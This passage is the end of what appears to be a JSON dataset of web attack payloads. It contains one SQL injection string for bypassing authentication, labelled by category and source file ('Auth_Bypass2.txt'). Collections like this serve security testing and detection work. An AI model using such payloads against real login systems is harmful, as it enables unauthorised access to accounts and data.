    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "'=\"or'",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  }
]